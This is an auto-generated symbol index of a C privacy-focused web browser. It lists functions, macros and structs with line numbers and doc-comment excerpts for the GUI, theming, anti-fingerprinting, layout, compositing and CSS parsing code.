- `UI_TAB_MAX_W` (line 79)
- `UI_TAB_NEW_W` (line 80)
- `UI_TAB_CLOSE_W` (line 81)
- `UI_BTN_W` (line 82)
- `UI_WIN_BTN_W` (line 83)
- `UI_MARGIN` (line 84)
- `UI_BTN_LEFT` (line 85)
- `UI_LIST_INDENT` (line 86)
- `UI_SCROLLBAR_W` (line 91)
- `UI_SCROLLBAR_MIN` (line 92)
- `UI_SCROLLBAR_PAD` (line 93)
- `UI_RESIZE_MARGIN` (line 97)
- `UI_MENU_W` (line 102)
- `UI_MENU_ITEM_H` (line 103)
- `UI_MENU_PAD` (line 104)
- `UI_CHECK_SZ` (line 105)
- `UI_MENU_LABEL_H` (line 106)
- `UI_MENU_INPUT_H` (line 107)
- `UI_HAMBURGER_W` (line 108)
- `UI_HAMBURGER_GAP` (line 109)
- `UI_CURSOR_SIZE` (line 110)
- `UI_TOAST_PAD` (line 111)
- `OMNI_MAX_SUGG` (line 112)
- `UI_OMNI_ROW_H` (line 113)
- `UI_TWO_PI` (line 114)
- `UI_INPUT_PAD` (line 118)
- `UI_INPUT_WIDTH` (line 119)
- `UI_BUTTON_HPAD` (line 120)
- `UI_FORM_FIELDS_MAX` (line 121)
- `UI_UNDERLINE_OFFSET` (line 126)
- `UI_UNDERLINE_THICK` (line 127)
- `UI_STRIKE_OFFSET` (line 128)
- `UI_OVERLINE_OFFSET` (line 129)
- `UI_SLICE_MAX` (line 133)
- `UI_MENU_COUNT` (line 192)
- `UI_IMAGE_MAX_BODY` (line 210)
- `UI_MAX_TABS` (line 225)
- `UI_READER_COLUMN_W` (line 492)
- `JS_NAV_MAX` (line 1738)
- `JS_TICKS_PER_LOAD` (line 1813)
- `UI_RELOAD_X` (line 2492)
- `RC_BOX_STACK_MAX` (line 2695)
- `RC_MAX_OUT_OF_FLOW` (line 3740)
- `OV_MAX_DEPTH` (line 5326)
- `PDF_PAGE_W` (line 5805)
- `PDF_PAGE_H` (line 5806)
- `PDF_MARGIN` (line 5807)
- `PNG_PAGE_W` (line 5956)
- `PNG_MARGIN` (line 5957)
- `PNG_MAX_H` (line 5958)
- `FBW_W` (line 7643)
- `FBW_H` (line 7645)
- `FBW_HEADER` (line 7646)
- `FBW_PAD` (line 7647)
- `FBW_LINE` (line 7648)
- `FBW_GUTTER` (line 7649)
- `FBW_MIN_SPLIT` (line 7650)
- `FBW_MAX_SPLIT` (line 7651)
- `FBW_COPY_BTN_W` (line 7652)
- `FBW_COPY_BTN_H` (line 7653)

**Structs:**
- `ui_menu_item` (line 165)
- `ui_input_state` (line 203) - *Live editable state for one form text control, aliasing a block of the current rd_doc (not owned; valid until the doc is replaced). The field carries the value * the user is editing; submission reads it back.*
- `ui_image` (line 216) - *A decoded image for one RD_IMAGE block of the current doc. surface owns the pixels (ARGB32) and is NULL when the image was blocked, not fetched, or could not be decoded (the placeholder is drawn instead). nat_w/nat_h are the natural * pixel dimensions. The block aliases w->doc (not owned).*
- `tab_ctx` (line 233) - *One tab's complete per-page state: everything that must persist when the tab is not the foreground one. The browser_window keeps the ACTIVE tab's copy in its own fields (so the 200+ render/event call sites stay unchanged); tab_save/tab_restore move this set in and out of the slot array on a switch. All owned pointers are transferred by value (no deep copy, no free): exactly one of {live window field, * inactive slot} owns each allocation at any time.*
- `browser_window` (line 248)
- `fetch_prep` (line 1335) - *Outcome of the pre-fetch gates shared by GET (do_load) and POST (do_submit_post). Both MUST pass through the SAME host filter, per-host exception, allowlist override and Tor/I2P realm route before any socket opens -- otherwise a POST could reach the * network under laxer rules than a GET, or leak a .onion lookup over clearnet.*
- `fetch_job` (line 1413) - *A network request handed to the fetch thread. It owns deep copies of every input string (the window's buffers may change while the fetch runs), and is filled with the result before being posted back to the main thread, which owns it from then on. The thread ONLY accesses the browser_window's stream_* fields (under stream_lock) * and the fetch_pipe/stream_evfd for I/O -- never any other field.*
- `rc_frag` (line 2582)
- `rc_row` (line 2616)
- `rc_box` (line 2635) - *One painted block box (Hito 23b-8 Step C): a border-box rectangle in layout space with its author decoration, painted behind the rows it encloses. Built from a maximal run of rd_blocks sharing one block_id. block_id is stamped at open_box time so position_doc can map an in-flow rc_box back to its pv_box_def (and the * resolved out-of-flow rect to the right ancestor).*
- `rc_layout` (line 2660)
- `rc_open_box` (line 2686) - *Box engine (Hito 23b-8 Step D): one entry of the open-box stack. A box's content rect (inner_left/inner_w) is the coordinate context its children (text or nested boxes) are placed in; bl/br/pb/bb are its borders/bottom-padding reserved geometry; * box_idx points at the rc_box rect being measured.*
- `rc_state` (line 2697)
- `rc_ext` (line 2975) - *Author text-presentation extensions for a block, derived from its rd_block (already * gated by caps.css upstream) and handed to flow_text.*
- `freebug_window` (line 7655)

#### `bui_theme.c`
**Path:** `gui/bui_theme.c`

**Functions:**
- `ui_theme_default` (line 14) `ui_theme ui_theme_default(void)` - *bui_theme — presentation palettes for the Wayland/Cairo GUI.  Carved out of browser_ui.c: the light/dark/sepia themes and the small colour helpers, none of which touch window state. The theme is the single source of truth for every font size, spacing and colour the renderer and chrome use.  #include "browser_ui_internal.h" #include "css_color.h" /* The single source of truth for the look of the browser.*
- `ui_theme_dark` (line 73) `ui_theme ui_theme_dark(void)` - *Dark reading palette. Shares all the metrics (font sizes, spacing) with the * default theme; only the colours change, so the box model stays in one place.*
- `ui_theme_sepia` (line 118) `ui_theme ui_theme_sepia(void)` - *Sepia reading palette: warm paper background and dark-brown ink, easier on the eyes for long-form text. Shares all the metrics with the default theme; only the * colours change.*
- `ui_theme_for` (line 160) `ui_theme ui_theme_for(int mode)` - *t.menu_bg        = (ui_rgb){ 0.95, 0.90, 0.80 }; t.menu_border    = (ui_rgb){ 0.55, 0.46, 0.32 }; t.menu_text      = (ui_rgb){ 0.26, 0.19, 0.10 }; t.check_border   = (ui_rgb){ 0.45, 0.36, 0.24 }; t.check_mark     = (ui_rgb){ 0.35, 0.45, 0.20 }; t.toast_bg       = (ui_rgb){ 0.30, 0.23, 0.14 }; t.toast_text     = (ui_rgb){ 0.96, 0.92, 0.84 }; t.scrollbar_track     = (ui_rgb){ 0.84, 0.78, 0.66 }; t.scrollbar_thumb     = (ui_rgb){ 0.58, 0.48, 0.34 }; t.scrollbar_thumb_hot = (ui_rgb){ 0.44, 0.35, 0.22 }; return t; } /* The single place that maps the theme mode to a palette.*
- `rgb_from_packed` (line 169) `ui_rgb rgb_from_packed(int packed)` - *t.scrollbar_thumb_hot = (ui_rgb){ 0.44, 0.35, 0.22 }; return t; } /* The single place that maps the theme mode to a palette. ui_theme ui_theme_for(int mode) { switch (mode) { case UI_THEME_DARK:  return ui_theme_dark(); case UI_THEME_SEPIA: return ui_theme_sepia(); default:             return ui_theme_default(); } } /* Converts a packed 0xRRGGBB author color into a theme RGB triple.*
- `set_rgb` (line 173) `void set_rgb(cairo_t *cr, ui_rgb c)`

#### `freedom_view.c`
**Path:** `gui/freedom_view.c`

**Functions:**
- `main` (line 36) `int main(int argc, char **argv)`

**Macros:**
- `_POSIX_C_SOURCE` (line 9)

#### `ui_render.c`
**Path:** `gui/ui_render.c`

**Functions:**
- `sanitize_utf8_inplace` (line 37) `static void sanitize_utf8_inplace(char *s)` - *Rewrites s in place to well-formed UTF-8, replacing any byte that is not part of a valid sequence with '?'. cairo_show_text rejects invalid UTF-8 and then silently stops drawing, so a single bad byte (e.g. a Latin-1 page) would blank the rest of the frame. Mirrors browser.c's sanitizer for the freedom-view tool, * which does not route text through browser_set_page. Output length <= input.*
- `button_rects` (line 105) `static void button_rects(const ui_window *w, double *min_x, double *max_x, double *close_x)` - *int    use_csd;    /* draw our own titlebar/controls (compositor has no SSD) int    maximized; double ptr_x, ptr_y; const char *title; const char *text; size_t      text_len; size_t      scroll; /* first visible line } ui_window; static void redraw(ui_window *w); /* Right-aligned control buttons: minimize, maximize, close.*
- `buffer_release` (line 112) `static void buffer_release(void *data, struct wl_buffer *wl_buffer)` - *size_t      text_len; size_t      scroll; /* first visible line } ui_window; static void redraw(ui_window *w); /* Right-aligned control buttons: minimize, maximize, close. static void button_rects(const ui_window *w, double *min_x, double *max_x, double *close_x) { close_x = w->width - UI_BTN_W; max_x   = w->width - 2 * UI_BTN_W; min_x   = w->width - 3 * UI_BTN_W; } /* --- shm buffer ---*
- `destroy_buffer` (line 119) `static void destroy_buffer(ui_window *w)`
- `ensure_buffer` (line 125) `static int ensure_buffer(ui_window *w)`
- `paint` (line 156) `static void paint(ui_window *w)` - *WL_SHM_FORMAT_ARGB8888); wl_shm_pool_destroy(pool); close(fd); if (w->buffer == NULL) { munmap(data, size); return -1; } wl_buffer_add_listener(w->buffer, &buffer_listener, w); w->shm_data = data; w->shm_size = size; w->cairo_surface = cairo_image_surface_create_for_data( (unsigned char *)data, CAIRO_FORMAT_ARGB32, w->width, w->height, stride); return (cairo_surface_status(w->cairo_surface) == CAIRO_STATUS_SUCCESS) ? 0 : -1; } /* --- painting ---*
- `redraw` (line 242) `static void redraw(ui_window *w)`
- `wm_base_ping` (line 257) `static void wm_base_ping(void *data, struct xdg_wm_base *b, uint32_t serial)` - *Always repaint and re-commit. We do not gate on buffer release: a single shm buffer can be re-attached, and gating on release deadlocks against * compositors that only release once a new buffer arrives. paint(w); wl_surface_attach(w->surface, w->buffer, 0, 0); wl_surface_damage_buffer(w->surface, 0, 0, w->width, w->height); wl_surface_commit(w->surface); } /* --- xdg-shell ---*
- `xdg_surface_configure` (line 263) `static void xdg_surface_configure(void *data, struct xdg_surface *s, uint32_t serial)`
- `toplevel_configure` (line 271) `static void toplevel_configure(void *data, struct xdg_toplevel *t,
                              ...`
- `toplevel_close` (line 281) `static void toplevel_close(void *data, struct xdg_toplevel *t)`
- `deco_configure` (line 292) `static void deco_configure(void *data, struct zxdg_toplevel_decoration_v1 *d, uint32_t mode)` - *The compositor tells us the actual decoration mode it granted. If it insists * on client-side, we draw our own titlebar; if server-side, we let it decorate.*
- `ptr_enter` (line 302) `static void ptr_enter(void *d, struct wl_pointer *p, uint32_t s,
                      struct wl_...` - *The compositor tells us the actual decoration mode it granted. If it insists * on client-side, we draw our own titlebar; if server-side, we let it decorate. static void deco_configure(void *data, struct zxdg_toplevel_decoration_v1 *d, uint32_t mode) { (void)d; ui_window *w = (ui_window *)data; w->use_csd = (mode == ZXDG_TOPLEVEL_DECORATION_V1_MODE_CLIENT_SIDE); fprintf(stderr, "[ui] decoration granted: %s\n", w->use_csd ? "client-side" : "server-side"); redraw(w); } static const struct zxdg_toplevel_decoration_v1_listener deco_listener = { deco_configure }; /* --- input (pointer axis = scroll) ---*
- `ptr_leave` (line 310) `static void ptr_leave(void *d, struct wl_pointer *p, uint32_t s, struct wl_surface *sf)`
- `ptr_motion` (line 313) `static void ptr_motion(void *d, struct wl_pointer *p, uint32_t t, wl_fixed_t x, wl_fixed_t y)`
- `ptr_button` (line 320) `static void ptr_button(void *d, struct wl_pointer *p, uint32_t serial, uint32_t t,
              ...` - *ui_window *w = (ui_window *)d; w->ptr_x = wl_fixed_to_double(x); w->ptr_y = wl_fixed_to_double(y); } static void ptr_leave(void *d, struct wl_pointer *p, uint32_t s, struct wl_surface *sf) { (void)d; (void)p; (void)s; (void)sf; } static void ptr_motion(void *d, struct wl_pointer *p, uint32_t t, wl_fixed_t x, wl_fixed_t y) { (void)p; (void)t; ui_window *w = (ui_window *)d; w->ptr_x = wl_fixed_to_double(x); w->ptr_y = wl_fixed_to_double(y); } /* Left-press on the client-side titlebar: hit-test the controls, else drag.*
- `ptr_axis` (line 342) `static void ptr_axis(void *data, struct wl_pointer *p, uint32_t time,
                     uint32...`
- `seat_caps` (line 364) `static void seat_caps(void *data, struct wl_seat *seat, uint32_t caps)`
- `seat_name` (line 374) `static void seat_name(void *d, struct wl_seat *s, const char *name)`
- `registry_global` (line 380) `static void registry_global(void *data, struct wl_registry *reg, uint32_t name,
                 ...` - *ui_window *w = (ui_window *)data; fprintf(stderr, "[ui] seat caps: pointer=%s\n", (caps & WL_SEAT_CAPABILITY_POINTER) ? "yes" : "no"); if ((caps & WL_SEAT_CAPABILITY_POINTER) && w->pointer == NULL) { w->pointer = wl_seat_get_pointer(seat); wl_pointer_add_listener(w->pointer, &pointer_listener, w); } } static void seat_name(void *d, struct wl_seat *s, const char *name) { (void)d; (void)s; (void)name; } static const struct wl_seat_listener seat_listener = { seat_caps, seat_name }; /* --- registry ---*
- `registry_remove` (line 399) `static void registry_remove(void *d, struct wl_registry *r, uint32_t name)`
- `ui_run_text_view` (line 407) `ui_status ui_run_text_view(const char *title, const char *text, size_t text_len)` - *w->seat = wl_registry_bind(reg, name, &wl_seat_interface, 1); wl_seat_add_listener(w->seat, &seat_listener, w); } else if (strcmp(iface, zxdg_decoration_manager_v1_interface.name) == 0) { w->deco_mgr = wl_registry_bind(reg, name, &zxdg_decoration_manager_v1_interface, 1); } } static void registry_remove(void *d, struct wl_registry *r, uint32_t name) { (void)d; (void)r; (void)name; } static const struct wl_registry_listener registry_listener = { registry_global, registry_remove }; /* --- public orchestrator ---*

**Macros:**
- `_GNU_SOURCE` (line 9)
- `UI_FONT_SIZE` (line 25)
- `UI_MARGIN` (line 27)
- `UI_TITLEBAR_H` (line 28)
- `UI_BTN_W` (line 29)
- `UI_BTN_LEFT` (line 30)

**Structs:**
- `ui_window` (line 65)

#### `anti_fp.c`
**Path:** `src/anti_fp.c`

**Functions:**
- `fp_coarsen_time_ms` (line 16) `uint64_t fp_coarsen_time_ms(uint64_t raw_ms)`
- `fp_user_agent` (line 22) `const char *fp_user_agent(void)` - *#include "anti_fp.h" /* --- clocks --- uint64_t fp_timer_resolution_ms(void) { return FP_TIMER_RESOLUTION_MS; } uint64_t fp_coarsen_time_ms(uint64_t raw_ms) { return raw_ms - (raw_ms % FP_TIMER_RESOLUTION_MS); } /* --- normalized identity (shared by all Freedom users) ---*
- `fp_accept_language` (line 26) `const char *fp_accept_language(void)`
- `fp_accept_language_header` (line 30) `const char *fp_accept_language_header(void)`
- `fp_timezone` (line 34) `const char *fp_timezone(void)`
- `fp_platform` (line 38) `const char *fp_platform(void)`
- `fp_vendor` (line 42) `const char *fp_vendor(void)`
- `fp_hardware_concurrency` (line 46) `int fp_hardware_concurrency(void)`
- `fp_device_memory_gb` (line 50) `int fp_device_memory_gb(void)`
- `fp_app_version` (line 56) `const char *fp_app_version(void)` - *const char *fp_vendor(void) { return ""; /* no vendor string: minimal entropy } int fp_hardware_concurrency(void) { return 2; /* fixed: do not reveal the real core count } int fp_device_memory_gb(void) { return 8; /* fixed: do not reveal the real memory size } /* --- legacy navigator properties (Hito 30b: blend-in) ---*
- `fp_app_code_name` (line 60) `const char *fp_app_code_name(void)`
- `fp_product` (line 64) `const char *fp_product(void)`
- `fp_app_name` (line 68) `const char *fp_app_name(void)`
- `fp_product_sub` (line 72) `const char *fp_product_sub(void)`
- `fp_oscpu` (line 76) `const char *fp_oscpu(void)`
- `fp_build_id` (line 80) `const char *fp_build_id(void)`
- `fp_max_touch_points` (line 84) `int fp_max_touch_points(void)`
- `fp_on_line` (line 88) `int fp_on_line(void)`
- `fp_cookie_enabled` (line 92) `int fp_cookie_enabled(void)`
- `fp_bucket_screen` (line 98) `void fp_bucket_screen(int w, int h, int *out_w, int *out_h)` - *int fp_max_touch_points(void) { return 0; } int fp_on_line(void) { return 1; } int fp_cookie_enabled(void) { return 1; } /* --- screen bucketing ---*
- `splitmix64` (line 120) `static uint64_t splitmix64(uint64_t *state)` - *long best_area = -1; size_t best = smallest; for (size_t i = 0; i < n; ++i) { if (buckets[i][0] <= w && buckets[i][1] <= h) { long area = (long)buckets[i][0] * (long)buckets[i][1]; if (area > best_area) { best_area = area; best = i; } } } if (out_w != NULL) *out_w = buckets[best][0]; if (out_h != NULL) *out_h = buckets[best][1]; } /* --- readback poisoning ---*
- `fp_perturb` (line 127) `void fp_perturb(uint8_t *buf, size_t len, uint64_t session_key)`
- `fp_origin_key` (line 138) `uint64_t fp_origin_key(uint64_t session_key, const char *registrable_domain)`

#### `box_style.c`
**Path:** `src/box_style.c`

**Functions:**
- `lc` (line 23) `static char lc(char c)` - *Longest recognised tag is "blockquote" (10); longest display keyword is "inline-block" (12). The buffers are generous so a normal token always fits and * anything longer fails closed instead of truncating. define BX_TAG_MAX     32u define BX_DISPLAY_MAX 24u*
- `is_ws` (line 27) `static int is_ws(char c)`
- `copy_lower_trim` (line 34) `static int copy_lower_trim(const char *in, char *out, size_t out_size)` - *Copies in into out, trimming ASCII whitespace and lowercasing. Returns 0 on * success, -1 if in is NULL, the trimmed token is empty, or it does not fit.*
- `name_cmp` (line 47) `static int name_cmp(const void *key, const void *elem)` - *Both row structs start with `const char *name`, so a pointer to a row is also a * pointer to its name field: one comparator serves both binary searches.*
- `bx_default_for_tag` (line 118) `bx_box bx_default_for_tag(const char *tag)` - *define TAG_N (sizeof TAG_TABLE / sizeof TAG_TABLE[0])*
- `bx_parse_display` (line 148) `bx_status bx_parse_display(const char *token, bx_display *out)` - *define DISP_N (sizeof DISP_TABLE / sizeof DISP_TABLE[0])*
- `bx_place` (line 158) `bx_hplace bx_place(double inset_l, double inset_r, double width_cap, int center,
                ...`
- `bx_width_cap` (line 175) `double bx_width_cap(int w_px, int w_pct, double avail_w)`
- `bx_content_cap` (line 183) `double bx_content_cap(double width_cap, int border_box,
                      double pad_l, doubl...`
- `bx_display_name` (line 194) `const char *bx_display_name(bx_display d)`

**Macros:**
- `BX_TAG_MAX` (line 21)
- `BX_DISPLAY_MAX` (line 22)
- `BLOCK` (line 57)
- `INLINE` (line 59)
- `IBLOCK` (line 60)
- `LITEM` (line 61)
- `NONE` (line 62)
- `EDG` (line 63)
- `ZERO` (line 64)
- `TAG_N` (line 117)
- `DISP_N` (line 147)

**Structs:**
- `tag_row` (line 53)
- `disp_row` (line 129)

#### `box_tree.c`
**Path:** `src/box_tree.c`

**Functions:**
- `layout_block` (line 35) `static bt_status layout_block(bt_node *node, bt_node *const *kids, size_t nk,
                   ...` - *Block container: stack non-none children vertically, collapsing each child's top * margin with the previous child's bottom margin.*
- `bt_nn` (line 56) `static double bt_nn(double v)` - *if (cavail < 0.0) cavail = 0.0; bt_status r = layout_node(c, cavail, depth + 1); if (r != BT_OK) return r; double top_gap = (prev_bottom > c->margin.top) ? prev_bottom : c->margin.top; c->y = cursor + top_gap; c->x = pl + c->margin.left; cursor = c->y + c->h; prev_bottom = c->margin.bottom; } node->h = cursor + prev_bottom + pb; return BT_OK; } /* Negative inputs clamp to zero (a basis never subtracts from the packing math).*
- `wrap_reverse` (line 76) `*
 * wrap_reverse (node->wrap_reverse): when node->wrap is active and node->wrap_reverse
 * is no...`
- `layout_grid` (line 199) `static bt_status layout_grid(bt_node *node, bt_node *const *kids, size_t nk,
                    ...` - *Grid: sized columns via flex_layout (fixed px reserved first, the rest split by fr weight; a NULL grid_track keeps the historical equal columns), placement row-major honouring per-item column spans (fx_grid_place_span: a span occupies N consecutive columns plus the gaps between them; one that does not fit in the row's remaining columns jumps to the next row), per-row max height. The column gap is always `gap`; the ROW gap is `row_gap` when has_row_gap is set (author `row-gap`, distinct from `column-gap`), else it falls back to `gap` too (a plain `gap: N` applies to both axes) -- has_row_gap defaults to 0 under zero-init, so * every caller that predates row-gap keeps its exact geometry.*
- `layout_node` (line 249) `static bt_status layout_node(bt_node *node, double avail_w, unsigned depth)`
- `bt_layout` (line 294) `bt_status bt_layout(bt_node *root, double avail_w)`
- `assign_doc_order` (line 335) `static void assign_doc_order(const pv_box_def *boxes, size_t nbox, size_t idx,
                  ...` - *Recursive doc_order assignment. The box tree is acyclic (each box has at most one parent_id), so the visited bitmap is just a guard against the degenerate * case of a cycle from a hostile document.*
- `find_positioned_ancestor` (line 352) `static int find_positioned_ancestor(const pv_box_def *boxes, size_t nbox,
                       ...` - *Walk the parent_id chain from `start` to find the nearest ancestor with position != STATIC. Returns the ancestor's index, or -1 if none exists (caller falls back to the viewport). Bounded by BT_MAX_DEPTH to keep a * hostile tree from looping.*
- `resolve_inset` (line 366) `static double resolve_inset(int v)` - *Resolves an inset value: PV_LEN_UNSET or BT_LEN_AUTO → 0 (anchor at the * containing block's edge); otherwise the px value.*
- `bt_resolve_positioning` (line 370) `bt_status bt_resolve_positioning(const pv_box_def *boxes, size_t nbox,
                          ...`

**Macros:**
- `BT_LEN_AUTO` (line 29)
- `BT_WRAP_EPS` (line 59)

#### `browser.c`
**Path:** `src/browser.c`

**Functions:**
- `free_page` (line 14) `static void free_page(browser_state *bs)` - *include <stdlib.h> include <string.h>*
- `clear_status` (line 25) `static void clear_status(browser_state *bs)` - *#include <stdlib.h> #include <string.h> static void free_page(browser_state *bs) { if (bs == NULL) return; free(bs->page_title); bs->page_title = NULL; free(bs->page_text); bs->page_text = NULL; bs->loading_error = 0; } /* Drops any active transient status.*
- `free_history` (line 29) `static void free_history(browser_state *bs)`
- `free_exceptions` (line 39) `static void free_exceptions(browser_state *bs)`
- `is_https_url` (line 48) `static int is_https_url(const char *s)`
- `is_local_path` (line 52) `static int is_local_path(const char *s)`
- `url_is_allowed` (line 57) `static int url_is_allowed(const char *url)`
- `xstrdup` (line 71) `static char *xstrdup(const char *s)`
- `cp1252_to_ucs` (line 86) `static unsigned int cp1252_to_ucs(unsigned char c)` - *Unicode scalar for a Windows-1252 byte (only meaningful for c >= 0x80). 0xA0.. 0xFF map identically to Latin-1; 0x80..0x9F carry the Windows-1252 glyphs; the * five undefined positions return 0 (the caller emits '?').*
- `utf8_encode` (line 100) `static size_t utf8_encode(unsigned int cp, char *out)` - *Encodes a BMP scalar (<= 0xFFFF) as UTF-8 into out (up to 3 bytes); returns the * byte count written.*
- `browser_init` (line 153) `browser_status browser_init(browser_state *bs)`
- `browser_free` (line 164) `void browser_free(browser_state *bs)`
- `browser_set_url_bar` (line 175) `browser_status browser_set_url_bar(browser_state *bs, const char *url)`
- `browser_commit_url_bar` (line 187) `browser_status browser_commit_url_bar(browser_state *bs)`
- `browser_navigate` (line 192) `browser_status browser_navigate(browser_state *bs, const char *url)`
- `browser_back` (line 227) `browser_status browser_back(browser_state *bs)`
- `browser_forward` (line 239) `browser_status browser_forward(browser_state *bs)`
- `browser_can_back` (line 251) `int browser_can_back(const browser_state *bs)`
- `browser_can_forward` (line 255) `int browser_can_forward(const browser_state *bs)`
- `browser_current_url` (line 259) `const char *browser_current_url(const browser_state *bs)`
- `browser_url_bar_selection` (line 264) `int browser_url_bar_selection(const browser_state *bs, size_t *start, size_t *len)`
- `browser_url_bar_delete_selection` (line 275) `int browser_url_bar_delete_selection(browser_state *bs)`
- `browser_url_bar_insert` (line 285) `browser_status browser_url_bar_insert(browser_state *bs, char c)`
- `browser_url_bar_backspace` (line 300) `browser_status browser_url_bar_backspace(browser_state *bs)`
- `browser_url_bar_delete` (line 314) `browser_status browser_url_bar_delete(browser_state *bs)`
- `browser_url_bar_move_cursor` (line 325) `browser_status browser_url_bar_move_cursor(browser_state *bs, long delta)`
- `browser_url_bar_extend_cursor` (line 335) `browser_status browser_url_bar_extend_cursor(browser_state *bs, long delta)`
- `browser_url_bar_set_cursor` (line 344) `browser_status browser_url_bar_set_cursor(browser_state *bs, size_t pos, int extend)`
- `browser_url_bar_select_all` (line 352) `browser_status browser_url_bar_select_all(browser_state *bs)`
- `browser_url_bar_clear` (line 359) `browser_status browser_url_bar_clear(browser_state *bs)`
- `browser_set_page` (line 368) `browser_status browser_set_page(browser_state *bs, const char *title,
                           ...`
- `browser_set_status` (line 390) `browser_status browser_set_status(browser_state *bs, const char *msg, uint64_t now_ms)`
- `browser_status_text` (line 404) `const char *browser_status_text(const browser_state *bs, uint64_t now_ms)`
- `host_equal` (line 412) `static int host_equal(const char *a, const char *b)` - *if (n >= BROWSER_STATUS_MAX) n = BROWSER_STATUS_MAX - 1; memcpy(bs->status_msg, msg, n); bs->status_msg[n] = '\0'; bs->status_expiry_ms = now_ms + BROWSER_STATUS_DURATION_MS; return BROWSER_OK; } const char *browser_status_text(const browser_state *bs, uint64_t now_ms) { if (bs == NULL || bs->status_msg[0] == '\0') return NULL; if (now_ms >= bs->status_expiry_ms) return NULL; return bs->status_msg; } /* --- exceptions (user override for weak TLS) ---*
- `browser_is_exception` (line 423) `int browser_is_exception(const browser_state *bs, const char *host)`
- `browser_add_exception` (line 431) `browser_status browser_add_exception(browser_state *bs, const char *host)`

**Macros:**
- `_POSIX_C_SOURCE` (line 6)

#### `compositor.c`
**Path:** `src/compositor.c`

**Functions:**
- `cx_forms_stacking_context` (line 15) `int cx_forms_stacking_context(const cx_style *s)`
- `cx_box_layer` (line 33) `cx_layer cx_box_layer(const cx_style *s)`
- `eff_z` (line 50) `static int eff_z(const cx_item *it)` - *Not a stacking context: a positioned box with z:auto still paints in the * positioned/zero layer (CSS 2.1 App E point 8). if (is_positioned(s->position)) return CX_LAYER_ZERO_Z; if (s->is_float) return CX_LAYER_FLOAT; if (s->is_inline) return CX_LAYER_INLINE; return CX_LAYER_BLOCK; } /* Effective z used to order within a layer: auto collapses to 0 (the ZERO_Z layer).*
- `cx_item_compare` (line 53) `int cx_item_compare(const cx_item *a, const cx_item *b)`
- `cx_sort` (line 70) `void cx_sort(cx_item *items, size_t n)` - *Stable insertion sort: n is bounded by the caller (BT_MAX_POSITIONED), so O(n^2) is fine, and stability keeps equal-key boxes in their original relative order (document order is already the final tie-break, so this only matters on true * key collisions). No allocation.*

#### `css.c`
**Path:** `src/css.c`

**Functions:**
- `parse_num` (line 147) `static int parse_num(const char *s, double *out, const char **endp)` - *Parses a leading non-negative number (digits + optional fraction). Returns 1 on * success, setting *out and *endp to the first unconsumed char.*
- `round_clamp` (line 167) `static int round_clamp(double v, int lo, int hi)` - *Rounds v to the nearest int, clamped to [lo, hi]. Clamping the double BEFORE the cast avoids undefined behaviour: casting an out-of-range double (e.g. a hostile "99999999999px") to int is UB. Every value interpreter that casts a parsed double * routes through here.*
- `parse_color` (line 176) `static int parse_color(const char *v)` - *Rounds v to the nearest int, clamped to [lo, hi]. Clamping the double BEFORE the cast avoids undefined behaviour: casting an out-of-range double (e.g. a hostile "99999999999px") to int is UB. Every value interpreter that casts a parsed double * routes through here. static int round_clamp(double v, int lo, int hi) { if (v >= (double)hi) return hi; if (v <= (double)lo) return lo; return (int)(v + (v < 0.0 ? -0.5 : 0.5)); } /* --- value interpreters (return -1 / sentinel when the value is unsupported) --- /* Like cc_parse but returns packed int with sentinels for currentColor/transparent.*
- `interp_color` (line 184) `static int interp_color(const char *v)`
- `interp_bg` (line 188) `static int interp_bg(const char *v)`
- `gradient` (line 220) `* or fewer than 2 stops drop the gradient (and, for the `background` shorthand,
 * the whole decl...`
- `find_linear_gradient` (line 268) `static int find_linear_gradient(const char *v, size_t *start, size_t *end,
                      ...` - *Locates a plain linear-gradient(...) call in v (case-insensitive; an occurrence that is the tail of a longer ident, e.g. repeating-linear-gradient, does not count). Writes the call span [start,end) (end past the closing paren) and the * argument span. 1 = found, 0 = absent, -1 = found but unbalanced (malformed).*
- `CSS_GRAD_STOPS_MAX` (line 302) `* CSS_GRAD_STOPS_MAX (stops past the cap are kept out unvalidated), or 0 when the
 * gradient fai...`
- `emit_gradient` (line 358) `static int emit_gradient(css_decl *dst, int cap, int angle, int nstops, const int *colors)` - *Emits the gradient decl group. nstops == 0 emits only the explicit reset * (P_BG_GRAD_N = 0), which is how a shorthand clears a lower-tier gradient.*
- `expand_bg_image` (line 378) `static int expand_bg_image(const char *val, css_decl *dst, int cap)` - *background-image: linear-gradient resolves to the gradient group; url()/none/ radial/conic/repeating-gradients/malformed all emit the explicit gradient reset * (never fetch, fail closed).*
- `path` (line 390) `* nor a gradient keeps the historical drop path (url()-only stays unset). */
static int expand_ba...`
- `interp_align` (line 415) `static int interp_align(const char *v)`
- `interp_fontsize` (line 423) `static int interp_fontsize(const char *v)`
- `interp_lineheight` (line 450) `static int interp_lineheight(const char *v)` - *line-height as a percent of the natural line box. A unitless multiplier ("1.5" -> 150) or a percent ("160%" -> 160); "normal" is unset (the UA default). Absolute px/em line-heights need a font size we don't have here, so they are dropped (return -1). * Clamped to [CSS_LINE_MIN, CSS_LINE_MAX] (anti-DoS).*
- `interp_weight` (line 464) `static int interp_weight(const char *v)`
- `interp_style` (line 473) `static int interp_style(const char *v)`
- `interp_textdeco` (line 484) `static int interp_textdeco(const char *v)` - *text-decoration / text-decoration-line: OR of the line keywords underline / overline / line-through found in the (space-separated) value. "none" -> 0 (explicit removal). Style/color/thickness tokens (wavy, red, 2px, solid, ...) are * ignored. A value carrying no line keyword at all is unsupported -> -1 (dropped).*
- `interp_display` (line 503) `static int interp_display(const char *v)`
- `interp_gap` (line 522) `static int interp_gap(const char *v)` - *One gap length. Reuses interp_len (px / em / rem / bare 0 / calc() / math functions), so a `gap: 1em` is 16px instead of the old misparse-as-1px, and a * trailing junk token fails closed. Negative fails; clamped to CSS_GAP_MAX.*
- `interp_justify` (line 528) `static int interp_justify(const char *v)`
- `count_tracks` (line 554) `static int count_tracks(const char *s, size_t n)`
- `track_size_of` (line 563) `static int track_size_of(const char *tok)` - *Size of ONE track token: `<N>fr` -> -(N*100); a px/em/rem length -> px (> 0); minmax(a,b) -> the size of its max component b; auto/%/unknown -> 0 (an equal * `auto` share downstream, never a wrong guess).*
- `count_one_repeat` (line 592) `static int count_one_repeat(const char *s, size_t tokstart, size_t toklen,
                      ...`
- `walk_tracks` (line 635) `static int walk_tracks(const char *s, size_t n, int *sizes, int szcap, int *pos)`
